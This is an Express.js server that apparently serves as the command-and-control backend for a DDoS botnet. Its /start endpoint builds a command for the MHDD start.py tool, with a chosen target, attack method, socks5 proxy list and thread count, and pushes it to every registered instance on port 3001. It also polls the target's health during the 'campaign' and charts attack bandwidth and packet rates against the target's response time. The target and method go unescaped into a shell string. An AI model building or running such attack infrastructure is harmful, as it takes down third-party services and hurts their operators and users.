const express = require('express');
const app = express();
const { admin } = require('./db');
require('./cronJob');
const axios = require('axios')
const { parseOutput, formatIpAddress, parseBPS, parsePPS, timeToSeconds, timestampToTimeString } = require('./util');
const db = admin.firestore();
const cors = require('cors');
const instancesCollection = db.collection('instances');
const targetLogsCollection = db.collection('target-logs');
const campaignsCollection = db.collection('campaigns');
const targetHealthCollection = db.collection('target-health'); 

app.use(cors({
    origin: ['http://localhost:5173', 'http://localhost:5174'],
    methods: ['GET', 'POST'],
    credentials: true
}));

async function monitorTargetHealth(target, campaignId, duration, interval = 5) {
    const monitoringStart = Date.now();
    const monitoringEnd = monitoringStart + (duration * 1000);
    let checkInProgress = false;
    
    const checkTarget = async () => {
        const timestamp = Date.now();
        if (timestamp >= monitoringEnd) {
            return;
        }

        // If a check is already in progress, skip this iteration
        if (checkInProgress) {
            console.log('Previous check still in progress, skipping...');
            setTimeout(checkTarget, interval * 1000);
            return;
        }

        checkInProgress = true;

        try {
            const startTime = Date.now();
            const response = await axios.get(target, {
                timeout: 60000, // 60 second timeout
                validateStatus: false, // Don't throw on non-2xx responses
                maxRedirects: 5 // Handle up to 5 redirects
            });

            const endTime = Date.now();
            
            const healthData = {
                target: target,
                campaignId: campaignId,
                timestamp: admin.firestore.FieldValue.serverTimestamp(),
                isAlive: response.status >= 200 && response.status < 600, // Consider any HTTP response as "alive"
                responseTime: endTime - startTime,
                httpStatus: response.status,
                checksCompleted: true,
                error: null
            };

            await targetHealthCollection.add(healthData);

        } catch (error) {
            const healthData = {
                target: target,
                campaignId: campaignId,
                timestamp: admin.firestore.FieldValue.serverTimestamp(),
                isAlive: false,
                responseTime: null,
                httpStatus: null,
                checksCompleted: true,
                error: error.code || error.message,
                timeout: error.code === 'ECONNABORTED' // Specifically flag timeout errors
            };

            await targetHealthCollection.add(healthData);
        } finally {
            checkInProgress = false;
        }

        // Schedule next check only if we haven't exceeded the monitoring duration
        const currentTime = Date.now();
        if (currentTime < monitoringEnd) {
            const timeSpent = currentTime - timestamp;
            const nextInterval = Math.max(interval * 1000 - timeSpent, 0);
            setTimeout(checkTarget, nextInterval);
        }
    };

    // Start monitoring
    checkTarget();
}

// Middleware to parse JSON bodies
app.use(express.json());

// Connect endpoint
app.post('/connect', async (req, res) => {
    try {
        // Get IP address from request
        const ipAddress = formatIpAddress(req.ip || req.connection.remoteAddress);

        // Generate unique instance ID if not provided
        const instanceId = req.body.instanceId || Date.now().toString();
        const serverRegion = req.body.region || 'None'

        // Create instance document 
        const instanceData = {
            instanceId: instanceId,
            region: serverRegion,
            status: "online",
            ipAddress: ipAddress,
            lastSeen: new Date().getTime(),
            rps: 0,
            gps: 0
        };
        console.log('Instance Successfully connected to server: ', instanceId);

        // Add or update instance in Firestore
        await instancesCollection.doc(instanceId).set(instanceData, { merge: true });

        res.status(200).json({
            status: 'success',
            message: 'Instance connected successfully',
            instanceId: instanceId
        });
    } catch (error) {
        console.error('Error connecting instance:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to connect instance',
            error: error.message
        });
    }
});

// Update endpoint
app.post('/update', async (req, res) => {
    try {
        const { instanceId, rps, gps, processes, campaign } = req.body;
        console.log(`Got updated resposne for campaign ${campaign} form instance ${instanceId}`);
        if (!instanceId) {
            return res.status(400).json({
                status: 'error',
                message: 'Instance ID is required'
            });
        }

        const updateData = {
            lastSeen: new Date().getTime()
        };

        if (typeof rps === 'number') updateData.rps = rps;
        if (typeof gps === 'number') updateData.gps = gps;

        // Handle process output data
        if (processes?.ATK?.output) {
            const parsedOutputs = parseOutput(processes.ATK.output);

            // Use batch write for better performance
            const batch = db.batch();

            // Process each parsed output
            parsedOutputs.forEach((parsedOutput) => {
                const docRef = targetLogsCollection.doc();
                batch.set(docRef, {
                    ...parsedOutput,
                    instanceId,
                    campaign,
                    servertime: new Date().getTime(),
                    createdAt: admin.firestore.FieldValue.serverTimestamp()
                });
            });

            // Commit the batch
            await Promise.all([
                instancesCollection.doc(instanceId).update(updateData),
                batch.commit()
            ]);
        } else {
            // If no process output, just update instance
            await instancesCollection.doc(instanceId).update(updateData);
        }

        res.status(200).json({
            status: 'success',
            message: 'Instance metrics updated successfully'
        });
    } catch (error) {
        console.error('Error updating instance metrics:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to update instance metrics',
            error: error.message
        });
    }
});

app.post('/start', async (req, res) => {
    try {
        const { target, duration, layer, method } = req.body;

        if (!target || !layer|| !method) {
            return res.status(400).json({
                status: 'error',
                message: 'Target, method and layer are required'
            });
        }

        // Validate duration
        const monitoringDuration = parseInt(duration) || 300; // Default to 5 minutes if not specified
        if (monitoringDuration < 0 || monitoringDuration > 3600) { // Max 1 hour
            return res.status(400).json({
                status: 'error',
                message: 'Duration must be between 0 and 3600 seconds'
            });
        }

        let finalCommand = '';
        if (layer === '7') {
            finalCommand = `source /home/ubuntu/MHDD/venv/bin/activate && python /home/ubuntu/MHDD/start.py ${method} ${target} 0 120 socks5.txt 3000 ${monitoringDuration} true`;
        } else if (layer === '4') {
            finalCommand = `source /home/ubuntu/MHDD/venv/bin/activate && python /home/ubuntu/MHDD/start.py ${method} ${target} 1 ${monitoringDuration} true`;
        } else {
            return res.status(400).json({
                status: 'error',
                message: 'Invalid layer specified. Must be either "4" or "7"'
            });
        }

        // Create campaign document
        const campaignData = {
            command: finalCommand,
            target,
            duration: monitoringDuration,
            layer,
            method,
            status: 'running',
            startTime: admin.firestore.FieldValue.serverTimestamp(),
            instances: []
        };

        // Add campaign to database
        const campaignRef = await campaignsCollection.add(campaignData);

        // Start health monitoring
        monitorTargetHealth(target, campaignRef.id, monitoringDuration);

        // Get all online instances
        const instancesSnapshot = await instancesCollection
            .where('status', '==', 'online')
            .get();

        if (instancesSnapshot.empty) {
            await campaignsCollection.doc(campaignRef.id).update({
                status: 'failed',
                error: 'No online instances available'
            });

            return res.status(400).json({
                status: 'error',
                message: 'No online instances available'
            });
        }

        // Send command to all online instances
        const sendPromises = instancesSnapshot.docs.map(async (doc) => {
            const instance = doc.data();
            const instanceIp = instance.ipAddress;

            try {
                await axios.post(`http://${instanceIp}:3001/command`, {
                    action: 'start',
                    processId: 'ATK',
                    command: finalCommand,
                    duration: monitoringDuration,
                    campaign: campaignRef.id 
                });

                await campaignsCollection.doc(campaignRef.id).update({
                    instances: admin.firestore.FieldValue.arrayUnion({
                        instanceId: doc.id,
                        ipAddress: instanceIp,
                        status: 'running'
                    })
                });

                return {
                    instanceId: doc.id,
                    status: 'success'
                };
            } catch (error) {
                console.error(`Failed to send command to instance ${doc.id}:`, error);

                await campaignsCollection.doc(campaignRef.id).update({
                    instances: admin.firestore.FieldValue.arrayUnion({
                        instanceId: doc.id,
                        ipAddress: instanceIp,
                        status: 'failed',
                        error: error.message
                    })
                });

                return {
                    instanceId: doc.id,
                    status: 'failed',
                    error: error.message
                };
            }
        });

        // Wait for all instances to receive commands
        const results = await Promise.all(sendPromises);

        // Check if any instances succeeded
        const successfulInstances = results.filter(r => r.status === 'success').length;

        if (successfulInstances === 0) {
            await campaignsCollection.doc(campaignRef.id).update({
                status: 'failed',
                error: 'Failed to start campaign on any instance'
            });

            return res.status(500).json({
                status: 'error',
                message: 'Failed to start campaign on any instance',
                results
            });
        }

        res.status(200).json({
            status: 'success',
            message: 'Campaign started successfully',
            campaignId: campaignRef.id,
            totalInstances: results.length,
            successfulInstances,
            failedInstances: results.length - successfulInstances,
            monitoringDuration,
            results
        });

    } catch (error) {
        console.error('Error starting campaign:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to start campaign',
            error: error.message
        });
    }
});

app.post('/stop', async (req, res) => {
    try {
        const { campaignId } = req.body;

        if (!campaignId) {
            return res.status(400).json({
                status: 'error',
                message: 'Campaign ID is required'
            });
        }

        // Get campaign data
        const campaignDoc = await campaignsCollection.doc(campaignId).get();
        
        if (!campaignDoc.exists) {
            return res.status(404).json({
                status: 'error',
                message: 'Campaign not found'
            });
        }

        const campaign = campaignDoc.data();
        
        if (campaign.status !== 'running') {
            return res.status(400).json({
                status: 'error',
                message: `Cannot stop campaign with status: ${campaign.status}`
            });
        }

        // Get all instances associated with this campaign
        const instances = campaign.instances || [];
        
        if (instances.length === 0) {
            return res.status(400).json({
                status: 'error',
                message: 'No instances found for this campaign'
            });
        }

        // Send stop command to all instances
        const stopPromises = instances.map(async (instance) => {
            if (instance.status !== 'running') {
                return {
                    instanceId: instance.instanceId,
                    status: 'skipped',
                    message: `Instance not running (status: ${instance.status})`
                };
            }

            try {
                await axios.post(`http://${instance.ipAddress}:3001/command`, {
                    action: 'stop',
                    processId: 'ATK'
                });

                await campaignsCollection.doc(campaignId).update({
                    instances: admin.firestore.FieldValue.arrayRemove(instance)
                });

                const updatedInstance = {
                    ...instance,
                    status: 'stopped'
                };

                await campaignsCollection.doc(campaignId).update({
                    instances: admin.firestore.FieldValue.arrayUnion(updatedInstance)
                });

                return {
                    instanceId: instance.instanceId,
                    status: 'success'
                };
            } catch (error) {
                console.error(`Failed to stop instance ${instance.instanceId}:`, error);

                await campaignsCollection.doc(campaignId).update({
                    instances: admin.firestore.FieldValue.arrayRemove(instance)
                });

                const updatedInstance = {
                    ...instance,
                    status: 'failed',
                    error: error.message
                };

                await campaignsCollection.doc(campaignId).update({
                    instances: admin.firestore.FieldValue.arrayUnion(updatedInstance)
                });

                return {
                    instanceId: instance.instanceId,
                    status: 'failed',
                    error: error.message
                };
            }
        });

        // Wait for all stop commands to complete
        const results = await Promise.all(stopPromises);

        // Count successful stops
        const successfulStops = results.filter(r => r.status === 'success').length;

        // Update campaign status
        if (successfulStops === 0) {
            await campaignsCollection.doc(campaignId).update({
                status: 'error',
                error: 'Failed to stop campaign on any instance'
            });
        } else if (successfulStops === instances.length) {
            await campaignsCollection.doc(campaignId).update({
                status: 'stopped',
                endTime: admin.firestore.FieldValue.serverTimestamp()
            });
        } else {
            await campaignsCollection.doc(campaignId).update({
                status: 'partially_stopped',
                endTime: admin.firestore.FieldValue.serverTimestamp()
            });
        }

        res.status(200).json({
            status: 'success',
            message: 'Stop commands sent successfully',
            campaignId,
            totalInstances: instances.length,
            successfulStops,
            failedStops: instances.length - successfulStops,
            results
        });

    } catch (error) {
        console.error('Error stopping campaign:', error);
        res.status(500).json({
            status: 'error',
            message: 'Failed to stop campaign',
            error: error.message
        });
    }
});

app.get('/trafficData', async (req, res) => {
    try {
        const { startDate, endDate, target, campaignId } = req.query;

        // Query traffic logs
        let trafficQuery = db
            .collection('target-logs')
            .where('campaignId', '==', campaignId)
            .orderBy('servertime', 'asc');

        // Query health checks
        let healthQuery = db
            .collection('target-health')
            .where('campaignId', '==', campaignId)
            .orderBy('timestamp', 'asc');

        // Apply filters to traffic query
        if (startDate) {
            const startTimestamp = new Date(parseInt(startDate));
            trafficQuery = trafficQuery.where('servertime', '>=', parseInt(startDate));
            healthQuery = healthQuery.where('timestamp', '>=', startTimestamp);
        }
        if (endDate) {
            const endTimestamp = new Date(parseInt(endDate));
            trafficQuery = trafficQuery.where('servertime', '<=', parseInt(endDate));
            healthQuery = healthQuery.where('timestamp', '<=', endTimestamp);
        }
        if (target) {
            trafficQuery = trafficQuery.where('Target', '==', target);
            healthQuery = healthQuery.where('target', '==', target);
        }

        // Execute both queries in parallel
        const [trafficSnapshot, healthSnapshot] = await Promise.all([
            trafficQuery.get(),
            healthQuery.get()
        ]);
        
        // Process traffic data
        const timeMap = new Map();

        trafficSnapshot.forEach(doc => {
            const docData = doc.data();
            if (docData && docData.time) {
                const time = docData.time;
                const bps = parseBPS(docData.BPS);
                const pps = parsePPS(docData.PPS);

                if (timeMap.has(time)) {
                    const existing = timeMap.get(time);
                    existing.bps += bps;
                    existing.pps += pps;
                    existing.count += 1;
                    if (!existing.targets.includes(docData.Target)) {
                        existing.targets.push(docData.Target || 'unknown');
                    }
                    if (!existing.methods.includes(docData.Method)) {
                        existing.methods.push(docData.Method || 'unknown');
                    }
                    if (!existing.ports.includes(docData.Port)) {
                        existing.ports.push(docData.Port || 0);
                    }
                } else {
                    timeMap.set(time, {
                        time: time,
                        servertime: docData.servertime,
                        bps: bps,
                        pps: pps,
                        responseTime: null,  // Will be filled if health data exists
                        count: 1,
                        targets: [docData.Target || 'unknown'],
                        methods: [docData.Method || 'unknown'],
                        ports: [docData.Port || 0]
                    });
                }
            }
        });

        // Process health data
        healthSnapshot.forEach(doc => {
            const healthData = doc.data();
            if (healthData && healthData.timestamp && healthData.responseTime) {
                const timeStr = timestampToTimeString(healthData.timestamp);
                
                if (timeMap.has(timeStr)) {
                    // Update existing entry
                    const existing = timeMap.get(timeStr);
                    existing.responseTime = healthData.responseTime;
                } else {
                    // Create new entry with only response time
                    timeMap.set(timeStr, {
                        time: timeStr,
                        servertime: healthData.timestamp.toMillis(),
                        bps: 0,
                        pps: 0,
                        responseTime: healthData.responseTime,
                        count: 0,
                        targets: [healthData.target || 'unknown'],
                        methods: [],
                        ports: []
                    });
                }
            }
        });

        // Convert map to array and sort
        const aggregatedData = Array.from(timeMap.values()).map(entry => ({
            time: entry.time,
            servertime: entry.servertime,
            bps: entry.bps,
            pps: entry.pps,
            responseTime: entry.responseTime,
            recordCount: entry.count,
            targets: entry.targets,
            methods: entry.methods,
            ports: entry.ports
        }));

        // Sort by time
        const sortedData = aggregatedData.sort((a, b) => {
            return timeToSeconds(a.time) - timeToSeconds(b.time);
        });

        res.json({ 
            success: true, 
            data: sortedData,
            totalRecords: sortedData.length,
            totalTrafficRecords: trafficSnapshot.size,
            totalHealthRecords: healthSnapshot.size
        });
    } catch (error) {
        console.error('Error processing traffic data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Error processing traffic data: ' + error.message 
        });
    }
});

app.get('/targetHealth', async (req, res) => {
    try {
        const { campaignId, startDate, endDate } = req.query;

        let query = targetHealthCollection
            .orderBy('timestamp', 'asc');

        if (campaignId) {
            query = query.where('campaignId', '==', campaignId);
        }
        if (startDate) {
            query = query.where('timestamp', '>=', new Date(parseInt(startDate)));
        }
        if (endDate) {
            query = query.where('timestamp', '<=', new Date(parseInt(endDate)));
        }

        const snapshot = await query.get();
        const healthData = [];

        snapshot.forEach(doc => {
            healthData.push(doc.data());
        });

        res.json({
            success: true,
            data: healthData
        });
    } catch (error) {
        console.error('Error fetching target health data:', error);
        res.status(500).json({
            success: false,
            error: 'Error fetching target health data: ' + error.message
        });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});